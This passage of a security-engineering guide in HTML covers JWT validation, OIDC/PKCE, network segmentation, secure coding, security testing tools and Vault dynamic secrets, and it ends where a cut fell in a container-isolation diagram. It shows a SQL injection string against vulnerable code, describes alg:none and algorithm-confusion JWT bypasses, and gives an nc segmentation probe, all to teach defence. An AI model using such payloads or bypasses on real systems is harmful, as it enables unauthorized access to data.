+  <g font-family="-apple-system, sans-serif">
+    <rect x="30" y="60" width="240" height="90" rx="8" fill="#21262d" stroke="#ff7b72"/><text x="150" y="84" text-anchor="middle" class="svg-label" fill="#ff7b72">Header</text><text x="150" y="108" text-anchor="middle" class="svg-sub">{ "alg":"RS256",</text><text x="150" y="126" text-anchor="middle" class="svg-sub">"typ":"JWT" }</text>
+    <rect x="290" y="60" width="240" height="90" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="410" y="84" text-anchor="middle" class="svg-label" fill="#58a6ff">Payload (claims)</text><text x="410" y="108" text-anchor="middle" class="svg-sub">sub, iss, aud, exp,</text><text x="410" y="126" text-anchor="middle" class="svg-sub">roles — NOT secret!</text>
+    <rect x="550" y="60" width="240" height="90" rx="8" fill="#21262d" stroke="#7ee787"/><text x="670" y="84" text-anchor="middle" class="svg-label" fill="#7ee787">Signature</text><text x="670" y="108" text-anchor="middle" class="svg-sub">sign(base64(h).base64(p),</text><text x="670" y="126" text-anchor="middle" class="svg-sub">private key)</text>
+    <text x="280" y="112" text-anchor="middle" class="svg-label">.</text><text x="540" y="112" text-anchor="middle" class="svg-label">.</text>
+    <text x="410" y="180" text-anchor="middle" class="svg-sub">Each part is base64url-encoded (NOT encrypted) — anyone can read the claims.</text>
+    <text x="410" y="204" text-anchor="middle" class="svg-sub" fill="#ff7b72">Trust comes from the signature: always verify alg, sig, exp, iss and aud. Never accept alg:none.</text>
+  </g>
+</svg>
+<figcaption>A JWT is three base64url segments joined by dots. The payload is readable by anyone — put no secrets in it — while the signature proves it was issued by the trusted party and not tampered with.</figcaption>
+</figure>
+<table>
+  <tr><th>Concept</th><th>Meaning</th></tr>
+  <tr><td>Authentication (AuthN)</td><td>Proving identity (password + MFA, cert, biometric)</td></tr>
+  <tr><td>Authorization (AuthZ)</td><td>What that identity is allowed to do (RBAC, ABAC)</td></tr>
+  <tr><td>OAuth 2.0</td><td>Delegated <em>authorization</em> — grant an app limited access without sharing your password</td></tr>
+  <tr><td>OIDC</td><td>Authentication layer on top of OAuth2 (adds ID tokens)</td></tr>
+  <tr><td>SAML</td><td>Enterprise SSO (XML-based, older but common)</td></tr>
+  <tr><td>JWT</td><td>Signed token carrying claims (stateless sessions)</td></tr>
+</table>
+<div class="box warn"><span class="box-title">JWT pitfalls</span><p>JWTs are signed, not encrypted — never put secrets in the payload (it's just base64). Always verify the signature <em>and</em> the algorithm (reject <code>alg: none</code> and algorithm-confusion attacks). Keep them short-lived with refresh tokens; you can't easily revoke a long-lived JWT. Validate <code>iss</code>, <code>aud</code>, and <code>exp</code>.</p></div>
+<div class="box best"><span class="box-title">Modern identity best practices</span><ul><li><strong>MFA everywhere</strong> — phishing-resistant (WebAuthn/passkeys) where possible.</li><li><strong>SSO</strong> via OIDC/SAML — one identity, central control, easy offboarding.</li><li><strong>Least-privilege RBAC/ABAC</strong> — authorize server-side, deny by default.</li><li><strong>Short-lived credentials</strong> — OIDC federation for machines (see <a href="cicd-complete-guide.html#pipeline-security">CI/CD OIDC</a>), not static keys.</li></ul></div>
+
+<h4>Why OAuth2, OIDC and JWT exist (and how they differ)</h4>
+<p>They solve three different problems people constantly conflate. <strong>OAuth2</strong> is <em>authorization delegation</em>: "let this app read my calendar without giving it my password." It issues <em>access tokens</em> for calling APIs. <strong>OIDC</strong> is a thin layer on top that adds <em>authentication</em>: "prove <em>who</em> this user is." It adds an <em>ID token</em> (a JWT) describing the user. <strong>JWT</strong> is just the token <em>format</em> — a signed, self-contained bundle of claims — used by both. Using OAuth2 access tokens for login (a common bug) is wrong because they answer "what may this app do," not "who is this user."</p>
+
+<h4>How the OIDC Authorization-Code + PKCE flow actually works</h4>
+<ol>
+<li>App redirects the user to the Identity Provider (IdP) with a <code>code_challenge</code> (a hash of a random secret the app keeps).</li>
+<li>User authenticates at the IdP (password + MFA) — the app never sees the password.</li>
+<li>IdP redirects back with a short-lived <strong>authorization code</strong>.</li>
+<li>App exchanges the code <em>plus the original secret</em> (<code>code_verifier</code>) at the token endpoint — PKCE proves it's the same app that started the flow, defeating code interception.</li>
+<li>IdP returns an <strong>ID token</strong> (who the user is) and <strong>access token</strong> (what the app may call).</li>
+</ol>
+
+<h4>How a JWT is validated on every request</h4>
+<div class="code-label label-config">A JWT's three base64 parts — and what the API must check</div>
+<pre><code>header:  {"alg":"RS256","kid":"abc"}     ← which key + algorithm
+payload: {"iss":"https://idp.acme.com","aud":"api://orders",
+          "sub":"user-1001","exp":1790000000,"scope":"orders:read"}
+signature: RS256( base64(header)+"."+base64(payload), IdP-private-key )
+
+# The API MUST, on every request:
+#   1. fetch the IdP's PUBLIC key by 'kid' (from its JWKS endpoint)
+#   2. verify the signature  -&gt; proves it wasn't forged/altered
+#   3. enforce alg = RS256   -&gt; REJECT alg:none and HS256 confusion
+#   4. check exp (not expired), iss (trusted issuer), aud (this API)
+#   5. then authorize using the claims (scope/roles)</code></pre>
+
+<div class="box danger"><span class="box-title">Common identity/JWT mistakes</span><ul><li><strong><code>alg: none</code> accepted</strong> — a classic bypass: attacker strips the signature and the server trusts an unsigned token. Pin the expected algorithm.</li><li><strong>Algorithm confusion (RS256→HS256)</strong> — server verifies an attacker-forged HS256 token using the <em>public</em> key as the HMAC secret. Never let the token pick the algorithm.</li><li><strong>Not validating <code>aud</code>/<code>iss</code></strong> — a valid token for a <em>different</em> service gets accepted here.</li><li><strong>Putting secrets in the JWT payload</strong> — it's signed, not encrypted; anyone can base64-decode it.</li><li><strong>Long-lived JWTs with no revocation</strong> — a stolen token works until expiry. Keep them short; use refresh tokens.</li><li><strong>Confusing AuthN with AuthZ</strong> — verifying the token is valid does <em>not</em> mean the user is allowed to do the action; still check scope/role server-side.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a festival wristband and a valet ticket</span><p>Authentication (OIDC/ID token) is the ID check at the festival gate that proves who you are. Authorization (OAuth2/access token) is the wristband saying which stages you may enter. A JWT is a wristband with a tamper-proof hologram — staff can check it's genuine on the spot without phoning the box office (stateless). But a wristband is not proof of identity, and a genuine hologram doesn't mean you're allowed backstage — the guard still checks the color.</p></div>
+
+<h2 id="network-sec">17. Network Security Deep</h2>
+<p class="section-intro">Defense in depth at the network layer: segmentation, firewalls, and the principle that the network is hostile.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 250" role="img" aria-label="Defense in depth network layers from edge to data tier">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Defense in depth — layered network zones, default-deny</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="30" y="70" width="150" height="120" rx="10" fill="#21262d" stroke="#ff7b72"/><text x="105" y="94" text-anchor="middle" class="svg-label" fill="#ff7b72">Edge</text><text x="105" y="120" text-anchor="middle" class="svg-sub">WAF + DDoS</text><text x="105" y="140" text-anchor="middle" class="svg-sub">rate limit</text><text x="105" y="164" text-anchor="middle" class="svg-sub">public subnet</text>
+    <rect x="210" y="70" width="150" height="120" rx="10" fill="#21262d" stroke="#f0883e"/><text x="285" y="94" text-anchor="middle" class="svg-label" fill="#f0883e">App tier</text><text x="285" y="120" text-anchor="middle" class="svg-sub">SG: only from LB</text><text x="285" y="140" text-anchor="middle" class="svg-sub">private subnet</text>
+    <rect x="390" y="70" width="150" height="120" rx="10" fill="#21262d" stroke="#58a6ff"/><text x="465" y="94" text-anchor="middle" class="svg-label" fill="#58a6ff">Data tier</text><text x="465" y="120" text-anchor="middle" class="svg-sub">SG: only from app</text><text x="465" y="140" text-anchor="middle" class="svg-sub">isolated subnet</text><text x="465" y="164" text-anchor="middle" class="svg-sub">no egress</text>
+    <rect x="580" y="70" width="210" height="120" rx="10" fill="none" stroke="#7ee787" stroke-dasharray="4 3"/><text x="685" y="94" text-anchor="middle" class="svg-label" fill="#7ee787">Every hop = a wall</text><text x="685" y="122" text-anchor="middle" class="svg-sub">default deny; allow only</text><text x="685" y="142" text-anchor="middle" class="svg-sub">the next needed source/port</text><text x="685" y="166" text-anchor="middle" class="svg-sub">one breach ≠ full access</text>
+    <g stroke="#8b949e" stroke-width="1.5">
+      <line x1="180" y1="130" x2="208" y2="130" marker-end="url(#sec-net)"/>
+      <line x1="360" y1="130" x2="388" y2="130" marker-end="url(#sec-net)"/>
+    </g>
+    <text x="410" y="222" text-anchor="middle" class="svg-sub">Segmentation contains a breach: an attacker in the app tier still cannot reach the internet or jump laterally.</text>
+  </g>
+  <defs><marker id="sec-net" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>Traffic passes through progressively more restricted zones, each with default-deny rules allowing only the previous tier. No single failure grants free movement — that's defense in depth.</figcaption>
+</figure>
+<table>
+  <tr><th>Control</th><th>Purpose</th></tr>
+  <tr><td>Segmentation (VLANs, subnets, VPCs)</td><td>Contain breaches; a compromise in one zone can't roam freely</td></tr>
+  <tr><td>Firewalls / Security Groups</td><td>Allow only needed ports/sources (default deny)</td></tr>
+  <tr><td>WAF</td><td>Filter app-layer attacks (SQLi, XSS) before they reach the app</td></tr>
+  <tr><td>IDS/IPS</td><td>Detect/block known attack signatures &amp; anomalies</td></tr>
+  <tr><td>DDoS protection</td><td>Absorb volumetric attacks (CloudFront/Shield, Cloudflare)</td></tr>
+  <tr><td>VPN / Zero-Trust Network Access</td><td>Secure remote access (ZTNA replaces broad VPN trust)</td></tr>
+</table>
+<div class="box note"><span class="box-title">Connects to other guides</span><p>The <a href="linux-complete-guide.html#adv-networking">Linux nftables section</a> shows host firewalls; <a href="cloud-aws-complete-guide.html#vpc-deep">Cloud VPC</a> covers cloud segmentation; <a href="kubernetes-complete-guide.html#networkpolicy">Kubernetes NetworkPolicies</a> are the pod-level firewall. Network security is layered across all of them.</p></div>
+
+<h4>Why network security still matters in a Zero-Trust world</h4>
+<p>Even when you verify every request (Zero Trust), network controls remain valuable as a second layer that <em>limits blast radius</em>. Identity can be stolen; a network segment that simply can't route to the database means a compromised web tier can't reach it even with valid credentials. Segmentation, default-deny firewalls, and WAFs raise the cost and shrink the reach of every attack — defense in depth, not a replacement for identity.</p>
+
+<h4>How the controls work mechanically</h4>
+<ul>
+<li><strong>Firewalls / Security Groups</strong> filter on the 5-tuple (src/dst IP, src/dst port, protocol). Default-deny means the implicit rule is "drop," and you explicitly allow only needed flows.</li>
+<li><strong>Segmentation</strong> puts tiers in separate subnets/VPCs so traffic between them must cross a controlled chokepoint — a compromise in the DMZ can't laterally reach the data tier.</li>
+<li><strong>WAF</strong> operates at layer 7: it parses HTTP and matches request bodies/params against attack signatures (SQLi, XSS) <em>before</em> they reach the app.</li>
+<li><strong>IDS/IPS</strong> inspect traffic for known-bad signatures/anomalies; IPS can drop inline, IDS only alerts.</li>
+</ul>
+
+<div class="code-label label-config">Default-deny security group: only what's needed</div>
+<pre><code># Web tier: allow 443 from the internet, nothing else inbound
+ingress: [{ proto: tcp, port: 443, source: 0.0.0.0/0 }]
+
+# DB tier: allow 5432 ONLY from the app tier's SG — never from the internet
+ingress: [{ proto: tcp, port: 5432, source: sg-app-tier }]
+egress:  []          # DB initiates no outbound connections
+# Result: even if the web box is popped, it can't reach the DB directly.</code></pre>
+<div class="code-label label-cmd">Verify segmentation actually holds</div>
+<pre><code># From a compromised-web-tier shell, the DB must be unreachable directly:
+nc -zv db.internal 5432
+#   nc: connect to db.internal port 5432 (tcp) failed: Connection timed out  ✓ blocked</code></pre>
+
+<div class="box danger"><span class="box-title">Common network security mistakes</span><ul><li><strong><code>0.0.0.0/0</code> on SSH/RDP/DB ports</strong> — the fastest way to get owned; scanners find it in minutes.</li><li><strong>Flat networks</strong> with no segmentation — one foothold reaches everything.</li><li><strong>Allow-all egress</strong> — lets malware phone home and exfiltrate data; restrict outbound too.</li><li><strong>Relying on the network alone</strong> and skipping identity/mTLS (the pre-Zero-Trust mistake).</li><li><strong>WAF in "count/log" mode</strong> forever instead of blocking.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: interior walls in a ship</span><p>Ships have watertight bulkheads so one hull breach floods only one compartment instead of sinking the vessel. Network segmentation is those bulkheads: default-deny firewalls are the sealed doors, and a WAF is the inspector at the gangway turning away obvious troublemakers. Zero Trust adds an ID check at every door — but you still want the bulkheads.</p></div>
+
+<h2 id="appsec">18. Secure Coding &amp; Application Security</h2>
+<p class="section-intro">Most vulnerabilities are introduced in code. Secure coding practices prevent whole classes of bugs before any scanner runs.</p>
+<table>
+  <tr><th>Vulnerability</th><th>Prevention</th></tr>
+  <tr><td>SQL Injection</td><td>Parameterized queries / prepared statements — never string-concat SQL</td></tr>
+  <tr><td>XSS</td><td>Context-aware output encoding; Content-Security-Policy header</td></tr>
+  <tr><td>CSRF</td><td>Anti-CSRF tokens, SameSite cookies</td></tr>
+  <tr><td>SSRF</td><td>Validate/allow-list outbound URLs; block cloud metadata IP</td></tr>
+  <tr><td>Insecure deserialization</td><td>Avoid deserializing untrusted data; use safe formats</td></tr>
+  <tr><td>Broken access control</td><td>Enforce authz on every request server-side, object-level</td></tr>
+</table>
+<div class="box danger"><span class="box-title">Never trust input — the golden rule</span><p>Every input (user forms, API params, headers, file uploads, even data from your own database) is potentially hostile. <strong>Validate</strong> (allow-list what's acceptable), <strong>sanitize</strong>, and <strong>encode on output</strong> for the target context. Combined with parameterized queries and server-side authz checks, this kills most of the OWASP Top 10 at the source.</p></div>
+
+<h4>Why secure coding beats scanning</h4>
+<p>Scanners find bugs <em>after</em> you write them; secure coding patterns prevent whole classes from ever existing. Parameterized queries don't "reduce SQL injection risk" — they make it structurally impossible, because the query structure and the data travel on separate channels the database never confuses. Adopting a handful of these patterns eliminates the majority of the OWASP Top 10 at the source, cheaper than any tool.</p>
+
+<h4>How injection works — and why parameterization stops it</h4>
+<p>Injection happens when untrusted data is <em>interpreted as code</em>. When you concatenate a user string into SQL, the database parses the whole thing together, so <code>' OR '1'='1</code> becomes part of the logic. A parameterized query sends the SQL template and the values <em>separately</em>: the driver compiles the template first, then binds values as pure data that can never change the query's structure — quotes and operators in the input are just characters.</p>
+
+<div class="code-label label-cmd">The same attack against vulnerable vs parameterized code</div>
+<pre><code># Vulnerable — input becomes part of the query:
+query = "SELECT * FROM users WHERE name = '" + name + "'"
+#   name = "' OR '1'='1"  →  SELECT * FROM users WHERE name = '' OR '1'='1'  → dumps ALL users
+
+# Safe — the ? is a slot; the value can never alter the query structure:
+db.execute("SELECT * FROM users WHERE name = ?", (name,))
+#   name = "' OR '1'='1"  →  searches literally for a user named  ' OR '1'='1   → 0 rows
+
+# XSS defense is the output-side equivalent — encode for the context:
+#   &lt;div&gt;{{ user_bio | escape }}&lt;/div&gt;   → &lt;script&gt; becomes &amp;lt;script&amp;gt;, inert</code></pre>
+
+<div class="box danger"><span class="box-title">Common secure-coding mistakes</span><ul><li><strong>String-building SQL/shell commands</strong> instead of parameterized queries / arg arrays → injection.</li><li><strong>Blocklist validation</strong> ("strip <code>&lt;script&gt;</code>") — attackers bypass it endlessly. Allow-list what's valid instead.</li><li><strong>Encoding for the wrong context</strong> — HTML-encoding data that lands in a JS or URL context doesn't protect it.</li><li><strong>Trusting client-side validation</strong> — it's UX, not security; always re-validate server-side.</li><li><strong>Reflecting error details/stack traces</strong> to users, leaking internals.</li><li><strong>Authorization checks in the controller but not on the object</strong> (IDOR).</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: keep the recipe and the groceries in separate bags</span><p>Injection is like writing a shopping list where a prankster can scribble "and also give me the cash register" into an item name, and the clerk reads the whole note as instructions. Parameterized queries hand the clerk a fixed instruction card and put the customer's words in a separate labeled envelope marked "data, not commands" — so no matter what the customer writes, it's treated as a product name, never an order to the clerk.</p></div>
+
+<h2 id="testing-deep">19. SAST / DAST / IAST / SCA / Fuzzing</h2>
+<p class="section-intro">The full spectrum of automated security testing — each catches different bug classes, so mature programs use several.</p>
+<figure class="diagram">
+<svg viewBox="0 0 820 210" role="img" aria-label="Security testing types across the lifecycle">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Testing types: where each looks</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="30" y="70" width="145" height="70" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="102" y="98" text-anchor="middle" class="svg-label" fill="#58a6ff">SAST</text><text x="102" y="118" text-anchor="middle" class="svg-sub">reads source</text><text x="102" y="133" text-anchor="middle" class="svg-sub">(white box)</text>
+    <rect x="190" y="70" width="145" height="70" rx="8" fill="#21262d" stroke="#7ee787"/><text x="262" y="98" text-anchor="middle" class="svg-label" fill="#7ee787">SCA</text><text x="262" y="118" text-anchor="middle" class="svg-sub">deps &amp; CVEs</text>
+    <rect x="350" y="70" width="145" height="70" rx="8" fill="#21262d" stroke="#f0883e"/><text x="422" y="98" text-anchor="middle" class="svg-label" fill="#f0883e">DAST</text><text x="422" y="118" text-anchor="middle" class="svg-sub">attacks running</text><text x="422" y="133" text-anchor="middle" class="svg-sub">app (black box)</text>
+    <rect x="510" y="70" width="145" height="70" rx="8" fill="#21262d" stroke="#d2a8ff"/><text x="582" y="98" text-anchor="middle" class="svg-label" fill="#d2a8ff">IAST</text><text x="582" y="118" text-anchor="middle" class="svg-sub">instruments</text><text x="582" y="133" text-anchor="middle" class="svg-sub">running app</text>
+    <rect x="670" y="70" width="120" height="70" rx="8" fill="#21262d" stroke="#ff7b72"/><text x="730" y="98" text-anchor="middle" class="svg-label" fill="#ff7b72">Fuzzing</text><text x="730" y="118" text-anchor="middle" class="svg-sub">random inputs</text><text x="730" y="133" text-anchor="middle" class="svg-sub">find crashes</text>
+  </g>
+</svg>
+<figcaption>SAST &amp; SCA run early (on code/deps); DAST &amp; IAST test the running app; fuzzing bombards inputs to find crashes and edge cases. Layer them — none alone is sufficient.</figcaption>
+</figure>
+<table>
+  <tr><th>Type</th><th>Full name</th><th>Finds</th><th>Tools</th></tr>
+  <tr><td>SAST</td><td>Static App Security Testing</td><td>Code flaws (injection, hardcoded secrets)</td><td>Semgrep, CodeQL, SonarQube</td></tr>
+  <tr><td>SCA</td><td>Software Composition Analysis</td><td>Vulnerable dependencies</td><td>Trivy, Snyk, Dependabot</td></tr>
+  <tr><td>DAST</td><td>Dynamic App Security Testing</td><td>Runtime flaws, config, auth</td><td>OWASP ZAP, Burp</td></tr>
+  <tr><td>IAST</td><td>Interactive AST</td><td>Runtime flaws with code context</td><td>Contrast, Seeker</td></tr>
+  <tr><td>Fuzzing</td><td>—</td><td>Crashes, memory bugs, edge cases</td><td>AFL++, libFuzzer, OSS-Fuzz</td></tr>
+</table>
+
+<h4>Why so many testing types</h4>
+<p>Each technique trades off <em>code visibility</em> against <em>runtime realism</em>, and no single point covers both. SAST has full code visibility but no runtime context (high coverage, false positives). DAST has full runtime realism but no code visibility (low false positives, misses unreachable paths). IAST sits inside the running app to get <em>both</em> — code context <em>and</em> runtime confirmation. SCA covers a dimension none of the others do (third-party code). Fuzzing finds the weird inputs a human would never think to try. Mature programs layer them because their blind spots don't overlap.</p>
+
+<h4>How IAST and fuzzing work under the hood</h4>
+<p><strong>IAST</strong> instruments the application (via an agent/bytecode hooks) so that while your normal functional tests or DAST run, it watches data flow <em>from inside</em>: it sees the tainted input arrive at the HTTP layer, follow through the code, and hit the SQL sink — confirming a real, reachable vulnerability with the exact line number. That combination of runtime proof + code location gives very low false positives. <strong>Fuzzing</strong> repeatedly feeds mutated/random inputs to a target and watches for crashes or sanitizer trips; coverage-guided fuzzers (libFuzzer, AFL++) instrument the binary and keep inputs that reach <em>new</em> code paths, evolving toward the edge cases that break parsers and memory safety.</p>
+
+<div class="code-label label-cmd">A coverage-guided fuzzer finding a crash</div>
+<pre><code># Fuzz a parser; libFuzzer mutates inputs and maximizes code coverage:
+clang -g -fsanitize=address,fuzzer parse_fuzz.c -o parse_fuzz
+./parse_fuzz corpus/
+#   #38217  NEW    cov: 412 ft: 588 corp: 41   (found a new code path)
+#   ==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
+#     READ of size 4 at 0x602000000114 in parse_header()
+#   Test unit written to ./crash-1a2b3c   ← reproducer for the exact bad input</code></pre>
+
+<div class="box warn"><span class="box-title">Common testing-strategy mistakes</span><ul><li><strong>Believing one tool is enough.</strong> SAST alone ships runtime/config bugs; DAST alone misses unreachable code and deep logic.</li><li><strong>Running everything on every commit</strong> — slow feedback. Run fast SAST/SCA on PRs; heavier DAST/fuzzing on schedules/nightlies.</li><li><strong>Fuzzing without sanitizers</strong> (ASan/UBSan) — you'll miss memory bugs that don't happen to crash.</li><li><strong>Not triaging</strong> — treating every SAST finding as equal drowns the real ones; prioritize by severity + reachability.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: inspecting a car every way</span><p>SAST reads the design docs; SCA checks for recalled parts; DAST is a stranger trying every door and pedal; IAST is a sensor <em>inside</em> the car reporting exactly which wire sparked when the test driver hit the brakes; fuzzing is strapping in a toddler who mashes every button in random combinations until something breaks. You want the whole battery — each finds faults the others can't.</p></div>
+
+<h2 id="vault-deep">20. Secrets &amp; Vault Deep</h2>
+<p class="section-intro">Static secrets in a manager are good; <em>dynamic</em> secrets that are generated on-demand and expire automatically are better. HashiCorp Vault is the reference implementation.</p>
+<figure class="diagram">
+<svg viewBox="0 0 820 200" role="img" aria-label="Vault issuing dynamic short-lived credentials">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Dynamic secrets: generated on request, auto-expiring</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="40" y="80" width="150" height="50" rx="8" fill="#21262d" stroke="#7ee787"/><text x="115" y="110" text-anchor="middle" class="svg-sub">app</text>
+    <rect x="330" y="75" width="160" height="60" rx="8" fill="#21262d" stroke="#d13438" stroke-width="2"/><text x="410" y="100" text-anchor="middle" class="svg-label" fill="#ff6b6f">Vault</text><text x="410" y="118" text-anchor="middle" class="svg-sub">generates &amp; tracks</text>
+    <rect x="630" y="80" width="150" height="50" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="705" y="105" text-anchor="middle" class="svg-sub">database</text>
+    <g stroke="#58a6ff" stroke-width="2"><line x1="190" y1="105" x2="328" y2="105" marker-end="url(#va)"/></g>
+    <line x1="490" y1="105" x2="628" y2="105" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="4" marker-end="url(#va)"/>
+    <text x="260" y="97" text-anchor="middle" class="svg-sub">request creds</text>
+    <text x="560" y="97" text-anchor="middle" class="svg-sub">creates temp user</text>
+    <text x="410" y="170" text-anchor="middle" class="svg-sub">App gets a username/password valid for 1 hour, then Vault revokes it automatically.</text>
+  </g>
+  <defs><marker id="va" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#58a6ff"/></marker></defs>
+</svg>
+<figcaption>Instead of a long-lived DB password sitting in config, the app asks Vault for credentials at runtime; Vault creates a temporary DB user that auto-expires. A leaked credential is useless within the hour.</figcaption>
+</figure>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 240" role="img" aria-label="Vault dynamic secret lease lifecycle with TTL renew and revoke">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Dynamic secret lease lifecycle — TTL, renew, revoke</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="30" y="80" width="150" height="56" rx="8" fill="#21262d" stroke="#7ee787"/><text x="105" y="104" text-anchor="middle" class="svg-label">1. Issue</text><text x="105" y="122" text-anchor="middle" class="svg-sub">lease_id + TTL 1h</text>
+    <rect x="230" y="80" width="150" height="56" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="305" y="104" text-anchor="middle" class="svg-label">2. Use</text><text x="305" y="122" text-anchor="middle" class="svg-sub">creds work in-window</text>
+    <rect x="430" y="80" width="150" height="56" rx="8" fill="#21262d" stroke="#f0883e"/><text x="505" y="104" text-anchor="middle" class="svg-label">3. Renew</text><text x="505" y="122" text-anchor="middle" class="svg-sub">extend if still needed</text>
+    <rect x="630" y="80" width="160" height="56" rx="8" fill="#21262d" stroke="#d13438" stroke-width="2"/><text x="710" y="104" text-anchor="middle" class="svg-label" fill="#ff6b6f">4. Revoke/Expire</text><text x="710" y="122" text-anchor="middle" class="svg-sub">DB user deleted</text>
+    <g stroke="#8b949e" stroke-width="1.5">
+      <line x1="180" y1="108" x2="228" y2="108" marker-end="url(#sec-lease)"/>
+      <line x1="380" y1="108" x2="428" y2="108" marker-end="url(#sec-lease)"/>
+      <line x1="580" y1="108" x2="628" y2="108" marker-end="url(#sec-lease)"/>
+    </g>
+    <path d="M505,136 C505,175 305,175 305,138" fill="none" stroke="#f0883e" stroke-width="1.5" stroke-dasharray="4 3" marker-end="url(#sec-lease)"/><text x="405" y="185" text-anchor="middle" class="svg-sub" fill="#f0883e">renew loop while workload alive</text>
+    <text x="410" y="220" text-anchor="middle" class="svg-sub">On TTL expiry (or explicit revoke), Vault deletes the backing DB user — no manual rotation, no orphaned creds.</text>
+  </g>
+  <defs><marker id="sec-lease" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>Every dynamic secret is a lease with a TTL. The workload renews while alive; on expiry or revoke, Vault tears down the backing credential automatically — a leaked secret has a short blast radius.</figcaption>
+</figure>
+
+<div class="code-label label-cmd">Vault dynamic database credentials</div>
+<pre><code># App authenticates to Vault (via K8s service account, cloud IAM, etc.)
+# then requests DB creds that didn't exist a second ago:
+vault read database/creds/readonly
+#   username: v-token-readonly-x7f3...   (valid 1h, then auto-revoked)
+#   password: A1b2C3...
+# Also: transit engine (encryption-as-a-service), PKI engine (issue certs),
+#       secret leasing, and full audit of every secret access.</code></pre>
+
+<h4>Why dynamic secrets beat static ones</h4>
+<p>A static secret has an unbounded blast radius over time: once created it's valid until someone remembers to rotate it, and any copy that leaked (a log, a backup, a laptop) works indefinitely. Dynamic secrets flip the model — the credential doesn't exist until an authenticated app asks for it, and it self-destructs on a short lease. A leaked dynamic credential is worthless within minutes, and rotation is automatic rather than a scary manual project.</p>
+
+<h4>How Vault leasing works under the hood</h4>
+<p>When an app requests <code>database/creds/readonly</code>, Vault uses its <em>own</em> admin connection to the database to run <code>CREATE ROLE ... VALID UNTIL ...</code>, generating a brand-new user with a random password scoped to that role. Vault returns those credentials <strong>plus a lease</strong> (e.g. TTL 1h, max TTL 24h) and a lease ID. Vault tracks every lease; when the TTL expires (or the app calls revoke), Vault connects to the DB and runs <code>DROP ROLE</code>, so the credential vanishes at the source. The app can <code>renew</code> before expiry if it's still working. Everything — issue, renew, revoke — is written to the audit log.</p>
+
+<div class="code-label label-cmd">Set up and use a dynamic DB secret with leasing</div>
+<pre><code># One-time: tell Vault how to talk to the DB and what a "readonly" role is:
+vault write database/config/appdb plugin_name=postgresql-database-plugin \
+  connection_url="postgresql://{{username}}:{{password}}@db:5432/app" \
+  allowed_roles=readonly username=vault-admin password=***
+vault write database/roles/readonly db_name=appdb default_ttl=1h max_ttl=24h \
+  creation_statements="CREATE ROLE \"{{name}}\" LOGIN PASSWORD '{{password}}' \
+                       VALID UNTIL '{{expiration}}'; GRANT SELECT ON ALL TABLES IN SCHEMA public TO \"{{name}}\";"
+
+# App requests creds at runtime — a user that didn't exist a second ago:
+vault read database/creds/readonly
+#   Key                Value
+#   lease_id           database/creds/readonly/9aF3...
+#   lease_duration     1h
+#   username           v-token-readonly-x7f3k2
+#   password           A1b2C3d4-E5f6
+
+# When the lease expires (or on revoke), Vault DROPs the role automatically:
+vault lease revoke database/creds/readonly/9aF3...
+#   Success! Revoked lease  → the DB user no longer exists.</code></pre>
+
+<div class="box danger"><span class="box-title">Common Vault/secrets-engine mistakes</span><ul><li><strong>Leaving Vault unsealed keys or the root token lying around</strong> — the root token should be revoked after setup; use auth methods instead.</li><li><strong>Giving apps overly broad policies</strong> (<code>path "*"</code>) — scope each role to exactly the paths it needs.</li><li><strong>Not enabling the audit device</strong> — then you can't answer "what did the breached app access?"</li><li><strong>Treating dynamic creds as static</strong> — caching them past their lease, then getting auth failures. Renew or re-fetch.</li><li><strong>Running a single Vault with no HA/auto-unseal</strong> — it becomes a single point of failure for every app.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a self-expiring guest Wi-Fi password</span><p>A static secret is your home Wi-Fi password taped to the fridge — it works forever and everyone who ever saw it can get back in. Dynamic secrets are like a hotel generating a unique guest code that only works during your stay and is auto-deleted at checkout. If a guest code leaks, it's useless by tomorrow, and nobody had to "rotate the Wi-Fi."</p></div>
+
+<h2 id="container-escape">21. Container Escape &amp; Isolation</h2>
+<p class="section-intro">Containers share the host kernel — weaker isolation than VMs. Understanding escape vectors is what lets you harden them properly.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 290" role="img" aria-label="Container isolation and escape vectors to the host kernel">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Container isolation vs escape — it's a process, not a VM</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="40" y="50" width="740" height="200" rx="10" fill="none" stroke="#484f58"/><text x="410" y="242" text-anchor="middle" class="svg-sub">Host kernel (shared) — namespaces + cgroups are the only wall</text>
+    <rect x="70" y="80" width="200" height="90" rx="8" fill="#21262d" stroke="#7ee787"/><text x="170" y="106" text-anchor="middle" class="svg-label" fill="#7ee787">Hardened container</text><text x="170" y="128" text-anchor="middle" class="svg-sub">non-root, read-only fs,</text><text x="170" y="146" text-anchor="middle" class="svg-sub">caps dropped, seccomp</text><text x="170" y="164" text-anchor="middle" class="svg-sub">✓ isolation intact</text>
